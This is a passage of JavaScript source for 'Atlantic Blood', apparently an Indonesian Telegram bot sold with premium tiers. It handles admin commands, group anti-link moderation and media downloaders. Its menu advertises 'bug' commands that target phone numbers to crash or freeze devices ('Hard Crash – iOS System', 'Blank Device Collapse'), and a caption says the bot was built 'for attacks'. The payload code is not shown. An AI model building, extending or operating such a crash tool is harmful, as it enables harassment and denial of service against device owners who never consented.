  if (args.length < 2) {
    return bot.sendMessage(chatId, `❌ Command salah. Masukan user id serta waktu expired.\nExample: /addprem 8463608152 30d`);
  }

  const userId = args[0].replace(/[^0-9]/g, "");
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `❌ User ID tidak valid.`);
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `❌ Durasi salah.\nExample: /addprem 8463608152 30d`);
  }

  const db = loadDB();
  if (!Array.isArray(db.premiums)) db.premiums = [];

  const jumlah = parseInt(duration);
  const satuan = duration.slice(-1);

  const now = moment();
  const expirationDate = moment().add(
    jumlah,
    satuan === "d" ? "days" : satuan === "h" ? "hours" : "minutes"
  );

  // Cek apakah user sudah premium
  let userData = db.premiums.find(x => x.id === userId);

  if (!userData) {
    // Tambah baru
    db.premiums.push({
      id: userId,
      expiresAt: expirationDate.toISOString()
    });

    saveDB(db);

    return bot.sendMessage(chatId, `✅️ ${userId} Berhasil ditambahkan sebagai user Premium sampai ${expirationDate.format("YYYY-MM-DD HH:mm:ss")}`);
  }

  // Extend premium
  const currentExp = moment(userData.expiresAt);
  const newExp = currentExp.isAfter(now)
    ? currentExp.add(jumlah, satuan === "d" ? "days" : satuan === "h" ? "hours" : "minutes")
    : expirationDate;

  userData.expiresAt = newExp.toISOString();
  saveDB(db);

  bot.sendMessage(chatId, `♻️ ${userId} Premium diperpanjang sampai ${newExp.format("YYYY-MM-DD HH:mm:ss")}`);
});


//─────DELETE PREMIUM─────\\
  bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // cek akses
  if (!isOwner(senderId) && !isAdmin(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner dan admin yang dapat menggunakan command ini.`);
  }

  // cek input
  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
Contoh: /delprem 584726249`);
  }

  const userId = match[1];

  // load database
  const db = loadDB();
  if (!Array.isArray(db.premiums)) db.premiums = [];

  // cari user premium
  const index = db.premiums.findIndex(u => u.id === userId);

  if (index === -1) {
    return bot.sendMessage(chatId, `
❌ User ${userId} tidak terdaftar sebagai premium.`);
  }

  // hapus data
  db.premiums.splice(index, 1);
  saveDB(db);

  bot.sendMessage(chatId, `
🗑️ User ${userId} berhasil dihapus dari daftar premium.`);
});
  
  
  
//─────GROUP ONLY─────\\
  bot.onText(/^\/grouponly (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const senderId = msg.from.id;
  
  if (!isOwner(fromId) && !isAdmin(fromId)) {
      return bot.sendMessage(msg.chat.id, "❌ Anda Terdeteksi Bukan Owner / Admin!");
    }

  if (msg.chat.type === "private") {
    return bot.sendMessage(
      chatId,
      "☇ Gunakan Command ini di group!",
      { parse_mode: "HTML" }
    );
  }

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    chatId,
    `❗️ Mode *Group Only* sekarang *${mode ? "AKTIF" : "NONAKTIF"}*`,
    { parse_mode: "HTML" }
  );
});



//─────DETECT LINK─────\\
bot.on("message", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text || msg.caption || "";

    if (!text) return;
    if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") return;

    const antilinkOn = antilinkData[chatId];
    const onlyAdminOn = onlyAdminData[chatId];

    if (!antilinkOn) return;

    const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|t\.me\/[^\s]+|bit\.ly\/[^\s]+)/gi;
    const foundLink = linkRegex.test(text);

    if (!foundLink) return;

    const member = await bot.getChatMember(chatId, userId);
    const isAdmin = ["creator", "administrator"].includes(member.status);

    if (onlyAdminOn && !isAdmin) {
      await bot.deleteMessage(chatId, msg.message_id);
      return bot.sendMessage(
        chatId,
        `❗️ @${msg.from.username || msg.from.first_name} tidak boleh kirim link di grup ini!`,
        { parse_mode: "HTML" }
      );
    }

    if (!onlyAdminOn) {
      await bot.deleteMessage(chatId, msg.message_id);
      return bot.sendMessage(
        chatId,
        `❗️ Link dilarang di grup ini!`,
        { parse_mode: "HTML" }
      );
    }

  } catch (err) {
    console.error("❌ Error antilink:", err);
  }
});



//─────ANTILINK GROUP─────\\
bot.onText(/^\/antilink(?:\s+(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const mode = match[1] ? match[1].toLowerCase() : null;

  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return bot.sendMessage(chatId, "❗️ Fitur ini hanya bisa digunakan di grup!");
  }

  const member = await bot.getChatMember(chatId, userId);
  if (!["creator", "administrator"].includes(member.status)) {
    return bot.sendMessage(chatId, "❗️ Hanya admin yang dapat mengubah status antilink!");
  }

  if (!mode) {
    const status = antilinkData[chatId] ? "ON" : "OFF";
    return bot.sendMessage(chatId, `❗️ Status antilink saat ini: *${status}*`, { parse_mode: "HTML" });
  }

  if (mode === "on") {
    antilinkData[chatId] = true;
    fs.writeFileSync(antilinkFile, JSON.stringify(antilinkData, null, 2));
    return bot.sendMessage(chatId, "❗️ Antilink *ON* — bot akan hapus semua link yang dikirim!", { parse_mode: "HTML" });
  }

  if (mode === "off") {
    delete antilinkData[chatId];
    fs.writeFileSync(antilinkFile, JSON.stringify(antilinkData, null, 2));
    return bot.sendMessage(chatId, "❗️ Antilink *OFF* — link boleh dikirim lagi.", { parse_mode: "HTML" });
  }

  return bot.sendMessage(chatId, "⚙️ Gunakan:\n/antilink on\n/antilink off");
});



//─────ONLY ADMIN─────\\
bot.onText(/^\/onlyadmin(?:\s+(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const mode = match[1] ? match[1].toLowerCase() : null;

  if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return bot.sendMessage(chatId, "❗️ Fitur ini hanya bisa digunakan di grup!");
  }

  const member = await bot.getChatMember(chatId, userId);
  if (!["creator", "administrator"].includes(member.status)) {
    return bot.sendMessage(chatId, "🚫 Hanya admin yang dapat mengubah mode onlyadmin!");
  }

  if (!mode) {
    const status = onlyAdminData[chatId] ? "ON" : "OFF";
    return bot.sendMessage(chatId, `❗️ Status onlyadmin saat ini: *${status}*`, { parse_mode: "HTML" });
  }

  if (mode === "on") {
    onlyAdminData[chatId] = true;
    fs.writeFileSync(onlyAdminFile, JSON.stringify(onlyAdminData, null, 2));
    return bot.sendMessage(chatId, "❗️ Mode *OnlyAdmin ON* — hanya admin yang boleh kirim link.", { parse_mode: "HTML" });
  }

  if (mode === "off") {
    delete onlyAdminData[chatId];
    fs.writeFileSync(onlyAdminFile, JSON.stringify(onlyAdminData, null, 2));
    return bot.sendMessage(chatId, "❗️ Mode *OnlyAdmin OFF* — semua admin boleh kirim link.", { parse_mode: "HTML" });
  }

  return bot.sendMessage(chatId, "☇ Gunakan:\n/onlyadmin on\n/onlyadmin off");
});



//─────START UTAMA─────\\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Anomali misterius";
  
  if (shouldIgnoreMessage(msg)) {
    return bot.sendMessage(chatId, "AWOKAOWK YATIM", { parse_mode: "HTML" });
  }

  bot.sendPhoto(chatId, "https://files.catbox.moe/bk5cbk.jpg", {
    caption: `
<blockquote><b>✦˚ ༘ ⋆  𝑨𝒕𝒍𝒂𝒏𝒕𝒊𝒄 ꪉ 𝑩𝒍𝒐𝒐𝒅 ( 大西洋 )  ⋆ ˚ ༘ ✦</b></blockquote>

<blockquote><b>𖥊 Author      : @K4ezarIX  
𖥊 Version     : 2.9.0 VIP  
𖥊 Script      : Atlantic Blood  
𖥊 Prefix      : /  
𖥊 Language    : JavaScript  </b></blockquote>

<blockquote><b>› Tekan tombol di bawah untuk membuka menu.</b></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝐍𝐞𝐱𝐭 𖣂 𝐓𝐨°𝐌𝐞𝐧𝐮", callback_data: "open_menu" },
        ],
        [
          { text: "༑ 𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 ༑", url: "https://t.me/K4ezarIX" },
        ],
      ],
    },
  });
});
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
  const date = getCurrentDate();
  const status = getStatus();
  const runtime = getRuntime();
  const greeting = getGreeting();
  const { commands, os } = getCaptionVariables();
  const userId = query.from.id;

  const editMenu = async (caption, keyboard) => {
    try {
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard },
      });
    } catch (err) {
      console.error("Edit menu error:", err);
      await bot.answerCallbackQuery(query.id, { text: "Menu ini sudah aktif.", show_alert: true });
    }
  };

  try {
    switch (query.data) {
      case "open_menu": {
        const media = {
          type: "photo",
          media: "https://files.catbox.moe/bk5cbk.jpg",
          caption: `
<blockquote><b>「 ⓘ. Olá ${username} 👋 」</b></blockquote>
( 🇷🇺 ) - Я, <b>Atlantic Blood,</b> бот, разработанный K4ezarIX для атак, и я создал его не для злоупотреблений.

<blockquote><b>𖥊 Author      : @K4ezarIX  
𖥊 Version     : 2.9.0 VIP  
𖥊 Script      : Atlantic Blood  
𖥊 Prefix      : /  
𖥊 Language    : JavaScript  

┏━━⌬  BOT STATUS  ⌬━━═⬡  
┣〄 Time : ${runtime}
┣〄 Cpu : ${cpuUsage}
┣〄 Date : ${date}
┣〄 Status : ${status}
┣〄 Platform : ${os}
┗━━━━━━━━━━━━━━━━═⬡</b></blockquote>

<blockquote><b># sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ</b></blockquote>`,
          parse_mode: "HTML",
        };

        const keyboard = [
          [
            { text: "𝑮𝒓𝒐𝒖𝒑°𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔", callback_data: "group_menu" },
            { text: "༺ 𝑩𝒖𝒈°𝑺𝒆𝒍𝒆𝒄𝒕𝒐𝒓 ༻", callback_data: "bug_menu" },
          ],
          [
            { text: "𝑪𝒐𝒓𝒆°𝑪𝒐𝒏𝒕𝒓𝒐𝒍", callback_data: "acces_menu" },
            { text: "𝑵𝒆𝒐𝑻𝒐𝒐𝒍𝒔°𝑯𝒖𝒃", callback_data: "tools_menu" },
          ],
          [
            { text: "𝐆𝐫𝐞𝐚𝐭 𖣂 𝐒𝐮𝐩𝐩𝐨𝐫𝐭", callback_data: "thanks_to" },
          ],
          [
            { text: "🕊 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒔𝒊", url: "https://t.me/AtlanticBlood" },
          ],
        ];

        await bot.editMessageMedia(media, {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: keyboard },
        });
        break;
      }
      
      case "group_menu": {
        const caption = `
<blockquote><pre>
/grouponly on
╰┈ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴇ

/grouponly off
╰┈ ᴍᴏᴅᴇ ᴏғғʟɪɴᴇ

/antilink on
╰┈ ᴀɴᴛɪʟɪɴᴋ ᴀᴄᴛɪᴠᴇ

/antilink off
╰┈ ᴀɴᴛɪʟɪɴᴋ ᴏғғʟɪɴᴇ

/onlyadmin on
╰┈ ᴏɴʟʏ ᴀᴅᴍɪɴ ᴀᴄᴛɪᴠᴇ

/onlyadmin off
╰┈ ᴏɴʟʏ ᴀᴅᴍɪɴ ᴏғғʟɪɴᴇ
━━━━━━━━━━━━━━━━━</pre></blockquote>
`;

        const keyboard = [
          [{ text: "⌫ 𝖡𝖺𝖼𝗄", callback_data: "open_menu" }],
        ];

        await editMenu(caption, keyboard);
        break;
      }
      
      case "acces_menu": {
        const caption = `
<blockquote><pre>
/connect 628xx
╰┈ ᴛᴀᴍʙᴀʜ sᴇɴᴅᴇʀ

/addprem ID Day 
╰┈ ᴛᴀᴍʙᴀʜ ᴘʀᴇᴍɪᴜᴍ

/delprem ID 
╰┈ ᴅᴇʟᴇᴛᴇ ᴘʀᴇᴍɪᴜᴍ

/addadmin ID
╰┈ ᴛᴀᴍʙᴀʜ ᴀᴅᴍɪɴ

/deladmin ID
╰┈ ᴅᴇʟᴇᴛᴇ ᴀᴅᴍɪɴ

/setcd Message
╰┈ ᴄᴏᴏʟᴅᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ
━━━━━━━━━━━━━━━━━</pre></blockquote>
`;

        const keyboard = [
          [{ text: "⌫ 𝖡𝖺𝖼𝗄", callback_data: "open_menu" }],
        ];

        await editMenu(caption, keyboard);
        break;
      }
      
            case "thanks_to": {
        const caption = `
<blockquote>༑𖣂 𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐𝒐 𖣂 ༑</blockquote>
 ⚚ K4ezarIX ( Author )
 ⚚ AzzCrow ( Owner Script )
 ⚚ zencxv ( Owner Support)
 
<blockquote><b>「 ⓘ. Atlantic - Blood 」</b></blockquote>
`;

        const keyboard = [
          [{ text: "⌫ 𝖡𝖺𝖼𝗄", callback_data: "open_menu" }],
        ];

        await editMenu(caption, keyboard);
        break;
      }
      
      
            case "tools_menu": {
        const caption = `
<blockquote>「 𝑻𝒐𝒐𝒍𝒔 - 𝑴𝒆𝒏𝒖°⚘ 」
メ.ᐟ /ytmp4
╰┈ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅ ʏᴏᴜᴛᴜʙᴇ

メ.ᐟ /tiktok
╰┈ ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ ɴᴏ ᴡᴍ

メ.ᐟ /play
╰┈ ᴍᴇɴᴄᴀʀɪ ʟᴀɢᴜ

メ.ᐟ /spotify
╰┈ ᴄᴀʀɪ ʟᴀɢᴜ sᴘᴏᴛɪғʏ

メ.ᐟ /brat
╰┈ ʙʀᴀᴛ sᴛɪᴄᴋᴇʀ

メ.ᐟ /iqc
╰┈ ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇ ᴄʜᴀᴛ

メ.ᐟ /hd
╰┈ ʜᴅ ᴘʜᴏᴛᴏ

メ.ᐟ /sticker
╰┈ ᴜʙᴀʜ ғᴏᴛᴏ ᴛᴏ sᴛɪᴄᴋᴇʀ

メ.ᐟ /ai
╰┈ ᴀɪ ɢᴇᴍɪɴɪ

メ.ᐟ /chatowner
╰┈ ᴄʜᴀᴛ ᴏᴡɴᴇʀ

<b>「 ⓘ. Atlantic - Blood .ᐟ 」</b></blockquote>
`;

        const keyboard = [
          [{ text: "⌫ 𝖡𝖺𝖼𝗄", callback_data: "open_menu" }],
        ];

        await editMenu(caption, keyboard);
        break;
      }
      
            
      case "bug_menu": {
        const caption = `
<blockquote><b>◇─「 ⧉ ATLANTIC • NEURO CORE  ⧉ 」─◇</b>

<b>┌─[01] ⚔ SHΛDOW PΛRΛLYZE</b>
<b>│   Command :</b> /atraso 62xxxx
<b>│   Effect  : Slowly Invisible Delay</b>
<b>└─────────────────────────</b>

<b>┌─[02] 🕊 NETHΞR DRΛIN</b>
<b>│   Command :</b> /overdrain 62xxxx
<b>│   Effect  : Drain × System Collapse</b>
<b>└─────────────────────────</b>

<b>┌─[03] 📟 CHΛOS SUNDΞR</b>
<b>│   Command :</b> /destruIdo 62xxxx
<b>│   Effect  : Visible Closure Break</b>
<b>└─────────────────────────</b>

<b>┌─[04] 🌎 VOID ΞXPLOSION</b>
<b>│   Command :</b> /explosao 62xxxx
<b>│   Effect  : Blank Device Collapse</b>
<b>└─────────────────────────</b>

<b>┌─[05] 🍏 SYS ΛPOCΛLYPSE</b>
<b>│   Command :</b> /apple 62xxxx
<b>│   Effect  : Hard Crash – iOS System</b>
<b>└─────────────────────────</b>

<b>┌─[06] 🐼 GLITCH SLOWBURST</b>
<b>│   Command :</b> /slowhit 62xxxx
<b>│   Effect  : Temporal Delay (Murbug)</b>
<b>└─────────────────────────</b>

<b>◇─「 ⧉ ATLANTIC • NEURO CORE  ⧉ 」─◇</b></blockquote>
`;
        await editMenu(caption, [[{ text: "⌫ 𝖡𝖺𝖼𝗄", callback_data: "open_menu" }]]);
        break;
      }

      /* ==========================
           UNKNOWN
      ========================== */
      default:
        await bot.answerCallbackQuery(query.id, {
          text: "Unknown Action",
          show_alert: true,
        });
        break;
    }

    await bot.answerCallbackQuery(query.id);

  } catch (error) {
    console.error("Callback error:", error);
    await bot.answerCallbackQuery(query.id, {
      text: "Terjadi kesalahan.",
      show_alert: true,
    });
  }
});
//---------TOOLS COMMAND---------\\
bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto yang kamu kirim."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Memproses Mohon Bersabar.....");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto Telah Berhasil Di Hd kan!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

const playing = new Map();

function txt(m) {
  return (m?.text || m?.caption || "").trim() || "";
}

function parseSecs(s) {
  if (typeof s === "number") return s;
  if (!s || typeof s !== "string") return 0;
  return s.split(":").map(n => parseInt(n, 10)).reduce((a, v) => a * 60 + v, 0);
}

async function topVideos(q) {
  const r = await yts.search(q);
  const list = Array.isArray(r) ? r : r.videos || [];
  return list
    .filter(v => {
      const sec = typeof v.seconds === "number"
        ? v.seconds
        : parseSecs(v.timestamp || v.duration?.timestamp || v.duration);
      return !v.live && sec > 0 && sec <= 1200;
    })
    .slice(0, 5)
    .map(v => ({
      url: v.url,
      title: v.title,
      author: (v.author?.name || v.author) || "YouTube",
      duration: v.timestamp || v.duration?.timestamp || v.duration
    }));
}

async function downloadToTemp(url, ext = ".mp3") {
  const file = path.join(os.tmpdir(), `otax_${Date.now()}_${Math.random().toString(36).slice(2)}${ext}`);
  const res = await axios.get(url, { responseType: "stream", timeout: 180000 });
  await new Promise((resolve, reject) => {
    const w = fs.createWriteStream(file);
    res.data.pipe(w);
    w.on("finish", resolve);
    w.on("error", reject);
  });
  return file;
}

function cleanup(f) { try { fs.unlinkSync(f); } catch {} }

function normalizeYouTubeUrl(raw) {
  if (!raw || typeof raw !== "string") return "";
  let u = raw.trim();
  const shortsMatch = u.match(/(?:youtube\.com\/shorts\/|youtu\.be\/shorts\/)([A-Za-z0-9_\-]+)/i);
  if (shortsMatch?.[1]) return `https://www.youtube.com/watch?v=${shortsMatch[1]}`;
  const youtuMatch = u.match(/^https?:\/\/youtu\.be\/([A-Za-z0-9_\-]+)/i);
  if (youtuMatch?.[1]) return `https://www.youtube.com/watch?v=${youtuMatch[1]}`;
  const watchMatch = u.match(/v=([A-Za-z0-9_\-]+)/i);
  if (watchMatch?.[1]) return `https://www.youtube.com/watch?v=${watchMatch[1]}`;
  return u;
}

// Format caption keren untuk lagu
function formatCaption(title, author, duration) {
  const durText = duration || "-";
  return `
🎵 *Now Playing* 🎵

🎼 *Title:* ${title}
👤 *Artist:* ${author}
⏱ *Duration:* ${durText}

🎶 Enjoy your music!
*「 ⓘ. Atlantic ☇ Blood .ᐟ 」*
`.trim();
}

bot.onText(/^\/play(?:@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match?.[1] || txt(msg.reply_to_message)).trim();

  if (!query) {
    return bot.sendMessage(chatId, "🎵 Ketik judul lagu atau reply link YouTube.", { reply_to_message_id: msg.message_id });
  }

  try {
    // Efek proses 1: mencari lagu
    const progressMsg = await bot.sendMessage(chatId, "⏳ Mencari lagu...");

    const isLink = /^https?:\/\/(www\.)?(youtube\.com|youtu\.be)\//i.test(query);
    const candidates = isLink ? [{ url: query, title: query, author: "YouTube" }] : await topVideos(query);

    if (!candidates.length) {
      await bot.editMessageText("❌ Tidak ada hasil ditemukan.", { chat_id: chatId, message_id: progressMsg.message_id });
      return;
    }

    const c = candidates[0];
    const ytUrl = normalizeYouTubeUrl(c.url);

    if (!/^https?:\/\/(www\.)?youtube\.com\/watch\?v=/i.test(ytUrl)) {
      await bot.editMessageText("❌ Hasil bukan video YouTube valid.", { chat_id: chatId, message_id: progressMsg.message_id });
      return;
    }

    // Efek proses 2: mengambil audio
    await bot.editMessageText("🔄 Mengambil audio dari YouTube...", { chat_id: chatId, message_id: progressMsg.message_id });

    const params = new URLSearchParams({ url: ytUrl, format: "mp3", quality: "128", type: "audio" });
    const apiUrl = "https://api.nekolabs.web.id/downloader/youtube/v1?" + params.toString();

    const r = await axios.get(apiUrl, { timeout: 60000, validateStatus: () => true });
    const body = r.data;

    if (r.status === 200 && body?.success && body.result?.downloadUrl) {
      const audioUrl = body.result.downloadUrl;
      const titleFromApi = body.result.title || c.title || "YouTube";
      const authorFromApi = body.result.author || c.author || "YouTube";
      const durationText = c.duration || body.result.duration || "-";

      // Efek proses 3: siap kirim audio
      await bot.editMessageText(`🎵 *${titleFromApi}* Proses...`, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "Markdown" });

      // Download dan kirim audio
      const file = await downloadToTemp(audioUrl, ".mp3");
      try {
        const sent = await bot.sendAudio(chatId, file, {
          caption: formatCaption(titleFromApi, authorFromApi, durationText),
          parse_mode: "Markdown",
          title: titleFromApi,
          performer: authorFromApi,
          reply_to_message_id: msg.message_id
        });
        playing.set(chatId, { msgId: sent.message_id, url: audioUrl, title: titleFromApi });
      } finally {
        cleanup(file);
      }

      // Hapus pesan progress
      await bot.deleteMessage(chatId, progressMsg.message_id);
      return;
    }

    const apiMsg = body?.message || body?.error || JSON.stringify(body || {}).slice(0, 200);
    await bot.editMessageText(`❌ Terjadi kesalahan\n• api: ${apiMsg}`, { chat_id: chatId, message_id: progressMsg.message_id });

  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan saat memproses lagu.\n• ${e.message}`, { reply_to_message_id: msg.message_id });
  }
});

bot.onText(/\/tiktok(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    // ambil url dari argumen atau dari reply
    const fromArgs = match[1]?.trim();
    const fromReply = msg.reply_to_message?.text?.trim();
    const url = fromArgs || fromReply;

    if (!url || !url.includes("tiktok.com")) {
      return bot.sendMessage(chatId, "⚠️ URL TikTok tidak valid!\n\nContoh:\n`/tiktok https://www.tiktok.com/...`", {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
      });
    }

    // request ke API
    const res = await fetch("https://www.tikwm.com/api/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ url }),
    });

    const data = await res.json().catch(() => null);

    if (!data || !data.data || !data.data.play) {
      return bot.sendMessage(chatId, "⚠️ Gagal mendapatkan video tanpa watermark.", {
        reply_to_message_id: msg.message_id,
      });
    }

    const videoUrl = data.data.play;
    const caption = "✅ SUKSES DOWNLOAD URL TIKTOK BY ZENCXV";

    await bot.sendVideo(chatId, videoUrl, {
      caption,
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("TikTok Command Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil video. Coba lagi nanti.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/^\/ytmp4(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ <b>Format salah!</b>\nGunakan:\n<code>/ytmp4 [judul video]</code>",
      { parse_mode: "HTML" }
    );
  }

  const loadingMsg = await bot.sendMessage(
    chatId,
    "⏳ <b>Mencari video di YouTube...</b>\n<i>Mohon tunggu sebentar 🔍</i>",
    { parse_mode: "HTML" }
  );

  try {
    // 🔍 Cari video di YouTube
    const search = await yts(query);
    if (!search.videos.length) {
      return bot.editMessageText("❌ Tidak ditemukan hasil untuk pencarianmu.", {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
      });
    }

    const video = search.videos[0];
    const videoUrl = video.url;

    await bot.editMessageText(
      `🎬 <b>Video ditemukan!</b>\n\n📺 <b>${video.title}</b>\n🧩 Channel: <i>${video.author.name}</i>\n⏱️ Durasi: <b>${video.timestamp}</b>\n👁️ Views: <b>${video.views.toLocaleString()}</b>\n\n🚀 <i>Sedang memproses download...</i>`,
      { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML" }
    );

    // ⚙️ Coba ambil dari API utama
    const apiList = [
      `https://restapi-v2.simplebot.my.id/download/ytdl?url=${encodeURIComponent(videoUrl)}`,
      `https://api.ryzendesu.vip/api/ytdl?url=${encodeURIComponent(videoUrl)}`,
      `https://api.zahwazein.xyz/downloader/ytdl?url=${encodeURIComponent(videoUrl)}`,
    ];

    let data = null;
    for (const api of apiList) {
      try {
        const res = await axios.get(api, { timeout: 25000 });
        if (res.data && (res.data.result || res.data.data)) {
          data = res.data.result || res.data.data;
          break;
        }
      } catch (e) {
        console.warn(`⚠️ Gagal ambil dari ${api}`);
      }
    }

    if (!data || (!data.mp4 && !data.mp3)) {
      return bot.editMessageText(
        "⚠️ Semua server downloader sedang sibuk.\nCoba lagi nanti 🙏",
        { chat_id: chatId, message_id: loadingMsg.message_id }
      );
    }

    const mp4Url = data.mp4;
    const mp3Url = data.mp3;

    // 📥 Unduh video dan audio
    const [videoRes, audioRes] = await Promise.allSettled([
      axios.get(mp4Url, { responseType: "arraybuffer" }),
      axios.get(mp3Url, { responseType: "arraybuffer" }),
    ]);

    if (videoRes.status !== "fulfilled") {
      return bot.sendMessage(chatId, "❌ Gagal mengunduh video dari server.");
    }

    const videoBuffer = videoRes.value.data;
    const audioBuffer = audioRes.status === "fulfilled" ? audioRes.value.data : null;

    // 🚫 Cek ukuran video (maks 50MB)
    if (videoBuffer.length > 49 * 1024 * 1024) {
      return bot.editMessageText(
        "⚠️ Ukuran video terlalu besar untuk dikirim lewat Telegram (maks 50MB).",
        { chat_id: chatId, message_id: loadingMsg.message_id }
      );
    }

    // 🎥 Kirim video
    await bot.sendVideo(chatId, videoBuffer, {
      caption: `
🎬 <b>${video.title}</b>
📺 ${video.author.name}
⏱️ Durasi: ${video.timestamp}
👁️ Views: ${video.views.toLocaleString()}

📥 <b>Video siap ditonton!</b>
💽 <i>Audio dikirim setelah ini...</i>
`.trim(),
      parse_mode: "HTML",
      supports_streaming: true,
    });

    // 🎧 Kirim audio (jika ada)
    if (audioBuffer) {
      await bot.sendAudio(chatId, audioBuffer, {
        title: video.title,
        performer: video.author.name,
        caption: "🎵 <b>Audio MP3 siap diputar!</b>\n🟢 <i>Selamat menikmati~</i>",
        parse_mode: "HTML",
      });
    }

    await bot.editMessageText(
      "✅ <b>Video & Audio berhasil dikirim!</b>\nTerima kasih telah menggunakan <b>YTMP4 Bot</b> 💫",
      { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML" }
    );
  } catch (err) {
    console.error("YTMP4 Error:", err.response?.data || err.message);
    await bot.editMessageText(
      "❌ <b>Gagal memproses video!</b>\n🔁 Coba lagi nanti ya.",
      { chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = (match && match[1]) ? match[1].trim() : "";

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]\nContoh: /brat "halo bro" --gif --delay=300');
  }

  // Helper: split args but keep quoted substrings together
  function splitArgsPreserveQuotes(str) {
    const re = /[^\s"]+|"([^"]*)"/g;
    const parts = [];
    let m;
    while ((m = re.exec(str)) !== null) {
      parts.push(m[1] ? m[1] : m[0]);
    }
    return parts;
  }

  try {
    const rawParts = splitArgsPreserveQuotes(argsRaw);

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let part of rawParts) {
      if (!part) continue;
      if (part === '--gif' || part === '--animated') {
        isAnimated = true;
      } else if (part.startsWith('--delay=')) {
        const val = parseInt(part.split('=')[1], 10);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(part);
      }
    }

    const text = textParts.join(' ').trim();
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }
    // Safety caps
    if (delay < 50) delay = 50;
    if (delay > 3000) delay = 3000;

